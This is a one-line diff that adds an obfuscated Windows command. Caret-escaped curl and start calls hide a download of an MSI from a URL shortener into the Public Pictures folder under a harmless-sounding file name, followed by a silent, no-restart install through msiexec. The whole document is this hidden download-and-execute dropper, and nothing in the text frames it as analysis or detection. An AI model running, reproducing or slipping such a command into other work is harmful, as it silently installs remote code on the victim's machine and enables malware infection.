@@ -1,0 +1,1 @@
+C:\Windows\System32\cmd.exe /c "c^u^rl.e^x^e -L https://tinyurl.com/y2efcn79 --output C:\Users\Public\Pictures\inetcxprint2.^m^s^i && st^ar^t /b msiexec.exe /i C:\Users\Public\Pictures\inetcxprint2.msi /qn /norestart && exit"
